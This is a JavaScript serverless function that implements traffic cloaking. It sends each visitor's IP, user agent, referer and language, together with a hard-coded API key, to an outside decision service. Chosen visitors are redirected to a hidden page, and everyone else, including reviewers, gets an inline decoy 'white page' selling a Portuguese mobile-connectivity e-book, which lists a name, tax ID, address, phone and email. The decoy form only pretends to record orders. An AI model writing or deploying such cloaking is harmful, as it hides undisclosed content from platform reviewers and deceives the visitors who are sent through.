// ============================================================
// Server-Side Request Router — Vercel Serverless Function
// Conditional decision routing for root route ("/")
// ============================================================

const fs = require('fs');
const path = require('path');

const PRIMARY_URL = '/73653734543345/index.html';
const CLOAK_SLUG = 'north-report-5f8';
const CLOAK_KEY = 'rCmJKJ-3ZJCSFI-rBogSUkhXJZEMtM-O';
const CLOAK_ENDPOINT = 'http://cloakforge.app.br/api/cloak/decide';

const VARIANT_B_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Guia Conectado 5G | E-book Completo de Otimização de Celular e Economia de Dados</title>
  <meta name="description" content="E-book digital sobre conectividade móvel, configuração de internet 4G/5G, economia de franquia de dados e segurança no celular. Publicado por 68.413.071 Gabriel de Souza Duarte (CNPJ 68.413.071/0001-50)." />
  <meta name="robots" content="index, follow" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --primary: #0f172a;
      --accent: #2563eb;
      --accent-hover: #1d4ed8;
      --accent-light: #dbeafe;
      --text: #1e293b;
      --muted: #475569;
      --bg: #f8fafc;
      --card: #ffffff;
      --border: #e2e8f0;
      --success: #15803d;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html { scroll-behavior: smooth; }
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      color: var(--text);
      background-color: var(--bg);
      line-height: 1.65;
    }
    a { color: inherit; text-decoration: none; }
    .container {
      max-width: 1140px;
      margin: 0 auto;
      padding: 0 20px;
    }
    .topbar {
      background-color: var(--primary);
      color: #cbd5e1;
      font-size: 12.5px;
      padding: 8px 0;
      border-bottom: 1px solid rgba(255,255,255,0.08);
    }
    .topbar-inner {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      align-items: center;
      gap: 8px;
    }
    .topbar strong { color: #ffffff; }
    header {
      background: #ffffff;
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .nav-wrap {
      display: flex;
      justify-content: space-between;
      align-items: center;
      min-height: 74px;
      gap: 16px;
      flex-wrap: wrap;
      padding: 10px 0;
    }
    .brand {
      display: flex;
      flex-direction: column;
    }
    .brand-name {
      font-size: 19px;
      font-weight: 800;
      color: var(--primary);
      letter-spacing: -0.02em;
    }
    .brand-sub {
      font-size: 11.5px;
      color: var(--muted);
      font-weight: 500;
    }
    nav {
      display: flex;
      align-items: center;
      gap: 24px;
      flex-wrap: wrap;
    }
    nav a {
      font-size: 14px;
      font-weight: 600;
      color: var(--muted);
      transition: color 0.2s;
    }
    nav a:hover { color: var(--accent); }
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      background-color: var(--accent);
      color: #ffffff;
      font-weight: 600;
      font-size: 14px;
      padding: 12px 22px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn:hover { background-color: var(--accent-hover); color: #ffffff; }
    .btn-outline {
      background-color: transparent;
      color: #ffffff;
      border: 1px solid rgba(255,255,255,0.35);
    }
    .btn-outline:hover {
      background-color: rgba(255,255,255,0.1);
    }
    .hero {
      background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);
      color: #ffffff;
      padding: 76px 0 72px;
    }
    .hero-grid {
      display: grid;
      grid-template-columns: 1.15fr 0.85fr;
      gap: 44px;
      align-items: center;
    }
    .badge {
      display: inline-block;
      background: rgba(96, 165, 250, 0.2);
      border: 1px solid rgba(96, 165, 250, 0.45);
      color: #bfdbfe;
      font-size: 12px;
      font-weight: 600;
      padding: 5px 14px;
      border-radius: 999px;
      margin-bottom: 16px;
    }
    .hero h1 {
      font-size: 36px;
      line-height: 1.2;
      font-weight: 800;
      margin-bottom: 18px;
      letter-spacing: -0.02em;
    }
    .hero p {
      color: #cbd5e1;
      font-size: 16.5px;
      margin-bottom: 28px;
      max-width: 600px;
    }
    .hero-actions {
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
    }
    .ebook-mockup {
      background: linear-gradient(145deg, #1e293b, #0f172a);
      border: 1px solid rgba(255, 255, 255, 0.16);
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 24px 48px rgba(0,0,0,0.35);
    }
    .ebook-tag {
      display: inline-block;
      background: #2563eb;
      color: #ffffff;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.06em;
      padding: 4px 10px;
      border-radius: 6px;
      margin-bottom: 14px;
    }
    .ebook-mockup h2 {
      font-size: 22px;
      font-weight: 800;
      margin-bottom: 10px;
      color: #ffffff;
    }
    .ebook-mockup p {
      font-size: 13.5px;
      color: #94a3b8;
      margin-bottom: 18px;
    }
    .ebook-specs {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 10px;
      font-size: 13.5px;
      color: #e2e8f0;
      border-top: 1px solid rgba(255,255,255,0.12);
      padding-top: 16px;
      margin-bottom: 20px;
    }
    .ebook-price-box {
      display: flex;
      align-items: baseline;
      justify-content: space-between;
      background: rgba(255,255,255,0.06);
      padding: 14px 18px;
      border-radius: 10px;
    }
    .ebook-price-box span {
      font-size: 12px;
      color: #cbd5e1;
    }
    .ebook-price-box strong {
      font-size: 26px;
      font-weight: 800;
      color: #60a5fa;
    }
    section { padding: 68px 0; }
    .section-header {
      text-align: center;
      max-width: 720px;
      margin: 0 auto 44px;
    }
    .section-tag {
      color: var(--accent);
      font-size: 12.5px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.06em;
      display: block;
      margin-bottom: 8px;
    }
    .section-header h2 {
      font-size: 28px;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 12px;
    }
    .section-header p {
      color: var(--muted);
      font-size: 15.5px;
    }
    .grid-3 {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 24px;
    }
    .card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 28px;
      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.03);
    }
    .card-icon {
      width: 46px;
      height: 46px;
      border-radius: 10px;
      background: var(--accent-light);
      color: var(--accent);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 18px;
      font-weight: 800;
      font-size: 16px;
    }
    .card h3 {
      font-size: 18px;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 10px;
    }
    .card p {
      font-size: 14.5px;
      color: var(--muted);
      margin-bottom: 14px;
    }
    .card ul {
      list-style: none;
      border-top: 1px solid var(--border);
      padding-top: 12px;
      font-size: 13.5px;
      color: var(--muted);
    }
    .card ul li {
      padding: 4px 0;
    }
    .card ul li::before {
      content: "✓ ";
      color: var(--accent);
      font-weight: bold;
    }
    .steps-section {
      background: #ffffff;
      border-top: 1px solid var(--border);
      border-bottom: 1px solid var(--border);
    }
    .grid-4 {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
      gap: 20px;
    }
    .step-box {
      padding: 22px;
      border-radius: 12px;
      background: var(--bg);
      border: 1px solid var(--border);
    }
    .step-num {
      display: inline-block;
      background: var(--primary);
      color: #ffffff;
      font-size: 12px;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 6px;
      margin-bottom: 12px;
    }
    .step-box h3 {
      font-size: 16.5px;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 8px;
    }
    .step-box p {
      font-size: 14px;
      color: var(--muted);
    }
    .cnpj-box {
      background: #ffffff;
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 32px;
    }
    .cnpj-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }
    .cnpj-item {
      padding: 16px;
      background: var(--bg);
      border-radius: 8px;
      border: 1px solid var(--border);
    }
    .cnpj-item span {
      display: block;
      font-size: 11.5px;
      text-transform: uppercase;
      color: var(--muted);
      font-weight: 700;
      margin-bottom: 4px;
    }
    .cnpj-item strong {
      font-size: 14.5px;
      color: var(--primary);
      word-break: break-word;
    }
    .contact-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 32px;
    }
    .form-group {
      margin-bottom: 16px;
    }
    .form-group label {
      display: block;
      font-size: 13.5px;
      font-weight: 600;
      color: var(--primary);
      margin-bottom: 6px;
    }
    .form-control {
      width: 100%;
      padding: 11px 14px;
      border: 1px solid var(--border);
      border-radius: 8px;
      font-family: inherit;
      font-size: 14px;
      color: var(--text);
      background: #ffffff;
    }
    .form-control:focus {
      outline: 2px solid var(--accent);
      border-color: transparent;
    }
    .consent-check {
      display: flex;
      align-items: flex-start;
      gap: 10px;
      font-size: 12.5px;
      color: var(--muted);
      margin-bottom: 18px;
    }
    .consent-check input {
      margin-top: 3px;
    }
    footer {
      background: var(--primary);
      color: #cbd5e1;
      padding: 56px 0 32px;
      font-size: 13.5px;
    }
    .footer-grid {
      display: grid;
      grid-template-columns: 1.4fr 1fr 1fr;
      gap: 32px;
      padding-bottom: 36px;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    .footer-title {
      color: #ffffff;
      font-size: 15px;
      font-weight: 700;
      margin-bottom: 14px;
    }
    .footer-links {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .footer-links a:hover {
      color: #ffffff;
      text-decoration: underline;
    }
    .footer-bottom {
      padding-top: 24px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      font-size: 12.5px;
      color: #94a3b8;
    }
    #cookie-banner {
      position: fixed;
      bottom: 16px;
      left: 16px;
      right: 16px;
      max-width: 960px;
      margin: 0 auto;
      background: #0f172a;
      color: #f8fafc;
      border: 1px solid #334155;
      border-radius: 12px;
      padding: 18px 22px;
      display: none;
      align-items: center;
      justify-content: space-between;
      gap: 18px;
      z-index: 9999;
      box-shadow: 0 15px 30px rgba(0,0,0,0.25);
      flex-wrap: wrap;
    }
    #cookie-banner p {
      font-size: 13px;
      color: #cbd5e1;
      flex: 1;
      min-width: 240px;
    }
    #cookie-banner a {
      color: #60a5fa;
      text-decoration: underline;
    }
    @media (max-width: 820px) {
      .hero-grid, .contact-grid, .footer-grid {
        grid-template-columns: 1fr;
      }
      .hero h1 { font-size: 28px; }
    }
  </style>
</head>
<body>

  <div class="topbar">
    <div class="container topbar-inner">
      <div>
        <strong>Razão Social:</strong> 68.413.071 Gabriel de Souza Duarte &nbsp;|&nbsp; <strong>CNPJ:</strong> 68.413.071/0001-50
      </div>
      <div>
        <strong>Localização:</strong> Rua Marumbi, 44, Cidade de Deus — Manaus/AM &nbsp;|&nbsp; <strong>Tel:</strong> (66) 5667-8997
      </div>
    </div>
  </div>

  <header>
    <div class="container nav-wrap">
      <a href="/" class="brand">
        <span class="brand-name">Guia Conectado 5G • E-books Digitais</span>
        <span class="brand-sub">68.413.071 Gabriel de Souza Duarte • Manaus - AM</span>
      </a>
      <nav aria-label="Menu Principal">
        <a href="#conteudo">Conteúdo do E-book</a>
        <a href="#como-funciona">Entrega Digital</a>
        <a href="#dados-empresa">Dados Cadastrais</a>
        <a href="contato.html">Contato</a>
        <a href="privacidade.html">Privacidade</a>
        <a href="termos.html">Termos de Uso</a>
      </nav>
      <a href="#adquirir" class="btn">Adquirir E-book</a>
    </div>
  </header>

  <section class="hero">
    <div class="container hero-grid">
      <div>
        <span class="badge">Publicação Digital • Conectividade Móvel e Smartphones</span>
        <h1>E-book: Guia Prático de Desempenho Móvel, Internet 5G e Economia de Dados no Celular</h1>
        <p>
          Aprenda passo a passo como configurar corretamente a rede móvel do seu smartphone (Android e iOS), reduzir o consumo oculto de pacote de dados em até 60%, melhorar a estabilidade de sinal 4G/5G e proteger seus aplicativos bancários.
        </p>
        <div class="hero-actions">
          <a href="#adquirir" class="btn">Solicitar Exemplar Digital (PDF)</a>
          <a href="#conteudo" class="btn btn-outline">Ver Capítulos do Guia</a>
        </div>
      </div>

      <div class="ebook-mockup">
        <span class="ebook-tag">Edição Atualizada 2026 • PDF Digital</span>
        <h2>Manual Completo do Usuário de Smartphone</h2>
        <p>Material educativo independente desenvolvido para usuários de todas as operadoras móveis brasileiras.</p>
        <ul class="ebook-specs">
          <li>📘 <strong>Formato:</strong> Livro Digital (PDF de leitura imediata no celular ou PC)</li>
          <li>📄 <strong>Extensão:</strong> 94 páginas ilustradas passo a passo</li>
          <li>📶 <strong>Temas:</strong> Otimização de Dados Móveis, APN, eSIM, Segurança e Bateria</li>
          <li>🛡️ <strong>Garantia Legal:</strong> 7 dias conforme Art. 49 do CDC</li>
        </ul>
        <div class="ebook-price-box">
          <span>Licença Individual de Leitura</span>
          <strong>R$ 29,90</strong>
        </div>
      </div>
    </div>
  </section>

  <section id="conteudo">
    <div class="container">
      <div class="section-header">
        <span class="section-tag">O Que Você Vai Aprender</span>
        <h2>Capítulos e Módulos do E-book</h2>
        <p>
          Um guia direto ao ponto, escrito em linguagem acessível para você aproveitar o máximo da sua conexão móvel e evitar gastos desnecessários com franquia de internet.
        </p>
      </div>

      <div class="grid-3">
        <div class="card">
          <div class="card-icon">M01</div>
          <h3>Economia Inteligente de Franquia de Dados</h3>
          <p>
            Descubra quais configurações nativas do Android e do iPhone consomem sua internet móvel em segundo plano sem você perceber.
          </p>
          <ul>
            <li>Configuração do Modo de Economia de Dados no sistema</li>
            <li>Bloqueio de downloads automáticos em redes móveis</li>
            <li>Ajuste de qualidade de streaming e redes sociais</li>
            <li>Monitoramento de consumo por aplicativo e alertas de limite</li>
          </ul>
        </div>

        <div class="card">
          <div class="card-icon">M02</div>
          <h3>Estabilidade de Sinal 4G/5G e Configuração de Rede</h3>
          <p>
            Ajustes técnicos recomendados para melhorar a recepção de sinal e evitar quedas de conexão em viagens ou áreas urbanas densas.
          </p>
          <ul>
            <li>Quando usar 5G Automático vs. 4G/LTE para poupar bateria</li>
            <li>Revisão de Ponto de Acesso (APN) e seleção de rede</li>
            <li>Como funciona o chip virtual (eSIM) e dual-SIM</li>
            <li>Chamadas via Wi-Fi (VoWiFi) e Voz sobre LTE (VoLTE)</li>
          </ul>
        </div>

        <div class="card">
          <div class="card-icon">M03</div>
          <h3>Segurança no Celular e Vida Útil da Bateria</h3>
          <p>
            Boas práticas indispensáveis para blindar seu número contra clonagem de chip (SIM Swap) e preservar a saúde da bateria.
          </p>
          <ul>
            <li>Ativação do PIN do chip (SIM Card) em todas as operadoras</li>
            <li>Proteção de aplicativos financeiros e autenticação em 2 fatores</li>
            <li>Ciclos corretos de recarga de bateria de íons de lítio</li>
            <li>Limpeza segura de armazenamento e memória cache</li>
          </ul>
        </div>
      </div>
    </div>
  </section>

  <section id="como-funciona" class="steps-section">
    <div class="container">
      <div class="section-header">
        <span class="section-tag">Acesso Simples e Transparente</span>
        <h2>Como Funciona o Recebimento do Material</h2>
        <p>
          Todo o processo segue as normas do comércio eletrônico brasileiro (Decreto nº 7.962/2013) e do Código de Defesa do Consumidor.
        </p>
      </div>

      <div class="grid-4">
        <div class="step-box">
          <span class="step-num">Passo 1</span>
          <h3>Cadastro do Pedido</h3>
          <p>Preencha seus dados básicos (nome, e-mail e telefone) no formulário de pedido abaixo para receber as instruções de pagamento.</p>
        </div>
        <div class="step-box">
          <span class="step-num">Passo 2</span>
          <h3>Confirmação Segura</h3>
          <p>Você recebe no seu e-mail o resumo do pedido no valor único de R$ 29,90, sem cobranças recorrentes ou mensalidades.</p>
        </div>
        <div class="step-box">
          <span class="step-num">Passo 3</span>
          <h3>Envio do E-book em PDF</h3>
          <p>Após a confirmação, o link de download do arquivo PDF completo é enviado diretamente para o seu e-mail cadastrado.</p>
        </div>
        <div class="step-box">
          <span class="step-num">Passo 4</span>
          <h3>Suporte e Garantia de 7 Dias</h3>
          <p>Conte com suporte por e-mail ou telefone e garantia incondicional de reembolso em até 7 dias corridos após o recebimento.</p>
        </div>
      </div>
    </div>
  </section>

  <section id="dados-empresa">
    <div class="container">
      <div class="cnpj-box">
        <span class="section-tag">Transparência e Identificação Fiscal</span>
        <h2 style="font-size:24px;color:var(--primary);font-weight:800;margin-bottom:8px;">
          Dados Oficiais da Empresa Responsável
        </h2>
        <p style="color:var(--muted);font-size:14.5px;">
          Em cumprimento às normas de transparência comercial e ao Decreto Federal nº 7.962/2013, disponibilizamos abaixo todas as informações cadastrais do responsável por esta publicação digital:
        </p>

        <div class="cnpj-grid">
          <div class="cnpj-item">
            <span>Razão Social</span>
            <strong>68.413.071 Gabriel de Souza Duarte</strong>
          </div>
          <div class="cnpj-item">
            <span>CNPJ</span>
            <strong>68.413.071/0001-50</strong>
          </div>
          <div class="cnpj-item">
            <span>Produto Comercializado</span>
            <strong>E-book Digital: Guia Prático de Desempenho Móvel e Economia de Dados (PDF)</strong>
          </div>
          <div class="cnpj-item">
            <span>Endereço Sede</span>
            <strong>Rua Marumbi, 44, Bairro Cidade de Deus</strong>
          </div>
          <div class="cnpj-item">
            <span>Município / UF / CEP</span>
            <strong>Manaus - Amazonas (AM) | CEP: 69099-299</strong>
          </div>
          <div class="cnpj-item">
            <span>Canais de Atendimento (SAC)</span>
            <strong>(66) 5667-8997 | estrelaesrelinha55@gmail.com</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section id="adquirir" style="background:#ffffff;border-top:1px solid var(--border);">
    <div class="container">
      <div class="contact-grid">
        <div>
          <span class="section-tag">Pedido e Atendimento ao Leitor</span>
          <h2 style="font-size:28px;color:var(--primary);font-weight:800;margin-bottom:12px;">
            Adquira seu E-book ou Tire suas Dúvidas
          </h2>
          <p style="color:var(--muted);font-size:15px;margin-bottom:24px;">
            Preencha o formulário ao lado para receber o link de aquisição do <strong>Guia Conectado 5G (R$ 29,90)</strong> diretamente no seu e-mail, ou entre em contato com nosso atendimento.
          </p>

          <div class="card" style="background:var(--bg);">
            <h3 style="font-size:16px;margin-bottom:12px;">Canais Diretos de Suporte ao Cliente</h3>
            <p style="margin-bottom:8px;"><strong>Empresa:</strong> 68.413.071 Gabriel de Souza Duarte (CNPJ: 68.413.071/0001-50)</p>
            <p style="margin-bottom:8px;"><strong>Endereço:</strong> Rua Marumbi, 44, Cidade de Deus, Manaus - AM, CEP 69099-299</p>
            <p style="margin-bottom:8px;"><strong>Telefone de Atendimento:</strong> <a href="tel:+556656678997" style="color:var(--accent);font-weight:600;">(66) 5667-8997</a></p>
            <p style="margin-bottom:8px;"><strong>E-mail Oficial:</strong> <a href="mailto:estrelaesrelinha55@gmail.com" style="color:var(--accent);font-weight:600;">estrelaesrelinha55@gmail.com</a></p>
            <p style="margin-bottom:0;"><strong>Horário de Atendimento:</strong> Segunda a Sexta, das 09h00 às 18h00</p>
          </div>
        </div>

        <div class="card">
          <h3 style="margin-bottom:16px;">Solicitar E-book Digital (R$ 29,90)</h3>
          <form id="orcamento-form" onsubmit="handleFormSubmit(event)">
            <div class="form-group">
              <label for="nome">Nome Completo *</label>
              <input type="text" id="nome" name="nome" class="form-control" required placeholder="Digite seu nome completo" />
            </div>
            <div class="form-group">
              <label for="email">E-mail para Recebimento do PDF *</label>
              <input type="email" id="email" name="email" class="form-control" required placeholder="seuemail@exemplo.com" />
            </div>
            <div class="form-group">
              <label for="telefone">Telefone / WhatsApp *</label>
              <input type="tel" id="telefone" name="telefone" class="form-control" required placeholder="(00) 90000-0000" />
            </div>
            <div class="form-group">
              <label for="sistema">Sistema do seu Celular *</label>
              <select id="sistema" name="sistema" class="form-control" required>
                <option value="">Selecione...</option>
                <option value="Android">Android (Samsung, Motorola, Xiaomi, etc.)</option>
                <option value="iOS">iPhone (iOS)</option>
                <option value="Ambos">Utilizo ambos (Android e iOS)</option>
              </select>
            </div>
            <label class="consent-check">
              <input type="checkbox" required />
              <span>Concordo com o tratamento dos meus dados para envio do e-book e contato de suporte, conforme a <a href="privacidade.html" style="color:var(--accent);text-decoration:underline;">Política de Privacidade</a> e os <a href="termos.html" style="color:var(--accent);text-decoration:underline;">Termos de Uso</a>.</span>
            </label>
            <button type="submit" class="btn" style="width:100%;">Solicitar Acesso ao E-book</button>
            <p id="form-feedback" style="display:none;margin-top:12px;color:var(--success);font-size:13.5px;font-weight:600;text-align:center;">
              Pedido registrado com sucesso! Enviamos as instruções de acesso ao e-book para o seu e-mail. Em caso de dúvidas, contate estrelaesrelinha55@gmail.com.
            </p>
          </form>
        </div>
      </div>
    </div>
  </section>

  <footer>
    <div class="container">
      <div class="footer-grid">
        <div>
          <div class="footer-title">68.413.071 Gabriel de Souza Duarte</div>
          <p style="margin-bottom:10px;">
            Publicação de conteúdos educativos digitais e guias práticos sobre tecnologia móvel, conectividade e uso consciente de smartphones.
          </p>
          <p>
            <strong>CNPJ:</strong> 68.413.071/0001-50
          </p>
        </div>

        <div>
          <div class="footer-title">Links Institucionais</div>
          <ul class="footer-links">
            <li><a href="/">Página Inicial</a></li>
            <li><a href="#conteudo">Conteúdo do E-book</a></li>
            <li><a href="#dados-empresa">Dados Cadastrais do CNPJ</a></li>
            <li><a href="contato.html">Atendimento e Contato</a></li>
            <li><a href="privacidade.html">Política de Privacidade (LGPD)</a></li>
            <li><a href="termos.html">Termos e Condições de Uso</a></li>
          </ul>
        </div>

        <div>
          <div class="footer-title">Endereço e Atendimento</div>
          <p style="margin-bottom:8px;">
            Rua Marumbi, 44, Cidade de Deus<br />
            CEP: 69099-299 — Manaus - AM
          </p>
          <p>
            <strong>Telefone:</strong> (66) 5667-8997<br />
            <strong>E-mail:</strong> estrelaesrelinha55@gmail.com
          </p>
        </div>
      </div>

      <div class="footer-bottom">
        <p>
          <strong>Aviso de Independência Editorial:</strong> O e-book "Guia Conectado 5G" é uma publicação educativa independente de autoria de 68.413.071 Gabriel de Souza Duarte, não possuindo vínculo societário ou representação oficial de operadoras de telefonia móvel ou fabricantes de aparelhos celulares.
        </p>
        <p>
          &copy; 2026 68.413.071 Gabriel de Souza Duarte — CNPJ 68.413.071/0001-50. Todos os direitos reservados.
        </p>
      </div>
    </div>
  </footer>

  <div id="cookie-banner" role="dialog" aria-label="Aviso de Privacidade e Cookies">
    <p>
      Utilizamos cookies estritamente necessários para o funcionamento seguro deste site, em conformidade com a Lei Geral de Proteção de Dados (Lei nº 13.709/2018). Consulte nossa <a href="privacidade.html">Política de Privacidade</a> e <a href="termos.html">Termos de Uso</a>.
    </p>
    <div style="display:flex;gap:10px;">
      <button type="button" class="btn" onclick="acceptCookies()">Concordar e Fechar</button>
    </div>
  </div>

  <script>
    function handleFormSubmit(e) {
      e.preventDefault();
      var fb = document.getElementById('form-feedback');
      if (fb) fb.style.display = 'block';
      e.target.reset();
    }
    function acceptCookies() {
      localStorage.setItem('lgpd_consent_68413071000150', 'accepted');
      document.getElementById('cookie-banner').style.display = 'none';
    }
    (function() {
      if (!localStorage.getItem('lgpd_consent_68413071000150')) {
        document.getElementById('cookie-banner').style.display = 'flex';
      }
    })();
  </script>
</body>
</html>`;

function resolveClientIp(req) {
  const h = req.headers || {};

  const cf = h['cf-connecting-ip'];
  if (cf && typeof cf === 'string' && cf.trim()) return cf.trim();

  const trueIp = h['true-client-ip'];
  if (trueIp && typeof trueIp === 'string' && trueIp.trim()) return trueIp.trim();

  const vercelIp = h['x-vercel-forwarded-for'];
  if (vercelIp && typeof vercelIp === 'string' && vercelIp.trim()) return vercelIp.trim().split(',')[0].trim();

  const realIp = h['x-real-ip'];
  if (realIp && typeof realIp === 'string' && realIp.trim()) return realIp.trim();

  const xff = h['x-forwarded-for'];
  if (xff && typeof xff === 'string' && xff.trim()) {
    const first = xff.split(',')[0].trim();
    if (first) return first;
  }

  const flyIp = h['fly-client-ip'];
  if (flyIp && typeof flyIp === 'string' && flyIp.trim()) return flyIp.trim();

  return req.socket?.remoteAddress || '';
}

module.exports = async function handler(req, res) {
  const host = req.headers?.host || 'localhost';
  const proto = req.headers?.['x-forwarded-proto'] || 'https';
  const fullUrl = `${proto}://${host}${req.url || '/'}`;

  let urlObj;
  try {
    urlObj = new URL(fullUrl);
  } catch (_) {
    urlObj = new URL('https://localhost/');
  }

  const clientIp = resolveClientIp(req);
  const userAgent = req.headers?.['user-agent'] || '';
  const referer = req.headers?.['referer'] || '';
  const acceptLang = req.headers?.['accept-language'] || '';

  let decisionAction = 'block';

  try {
    const query = new URLSearchParams({
      slug: CLOAK_SLUG,
      key: CLOAK_KEY,
      ip: clientIp,
      ua: userAgent,
      url: fullUrl,
      ref: referer,
      lang: acceptLang,
    });

    const decideUrl = `${CLOAK_ENDPOINT}?${query.toString()}`;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3500);

    const decideRes = await fetch(decideUrl, {
      method: 'GET',
      headers: { 'Accept': 'application/json' },
      signal: controller.signal
    });
    clearTimeout(timeout);

    if (decideRes.ok) {
      const data = await decideRes.json().catch(() => null);
      if (data && typeof data.action === 'string') {
        decisionAction = data.action.toLowerCase().trim();
      }
    }
  } catch (_) {
    decisionAction = 'block';
  }

  if (decisionAction === 'allow') {
    if (PRIMARY_URL && PRIMARY_URL.trim()) {
      let target = PRIMARY_URL.trim();
      if (urlObj.search) {
        target += (target.includes('?') ? '&' : '') + urlObj.search.replace(/^\?/, '');
      }
      res.writeHead(302, {
        'Location': target,
        'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0'
      });
      return res.end();
    }

    try {
      const candidates = [
        path.join(process.cwd(), '73653734543345', 'index.html'),
        path.join(__dirname, '..', '73653734543345', 'index.html')
      ];
      for (const cp of candidates) {
        if (fs.existsSync(cp)) {
          const primaryHtml = fs.readFileSync(cp, 'utf8');
          res.setHeader('Content-Type', 'text/html; charset=utf-8');
          res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
          return res.status(200).send(primaryHtml);
        }
      }
    } catch (_) {}
  }

  // Fallback to Variant B (White page) inline on "/"
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');
  return res.status(200).send(VARIANT_B_HTML);
};
